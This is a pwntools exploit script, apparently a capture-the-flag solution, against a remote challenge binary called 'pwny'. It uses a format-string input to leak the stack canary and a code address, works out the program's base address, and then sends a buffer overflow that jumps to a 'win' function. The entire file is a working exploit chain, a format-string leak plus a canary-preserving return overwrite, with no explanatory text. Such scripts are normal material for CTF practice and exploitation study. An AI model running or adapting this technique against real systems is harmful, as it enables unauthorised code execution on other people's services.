from pwn import *

elf = ELF('./pwny')
# nc kubenode.mctf.io 30012
r = remote('kubenode.mctf.io', 30012)
# r = elf.process()

# r = gdb.debug(elf.path, '''
#     b * name_pony+0x95
#     b * name_pony
# ''')

r.sendline(b'%19$p %21$p')

r.recvuntil(b'name: ')
leak = r.recvline().strip().split(b', ')[0]
canary, offset = leak.split(b' ')
canary = int(canary, 16)
elf.address = int(offset, 16) - 0x86 - 0x135e

payload = b'A' * (9 * 8) + p64(canary) + p64(0xdeadbeef) + p64(elf.sym['win'])

r.sendline(payload)

r.interactive()
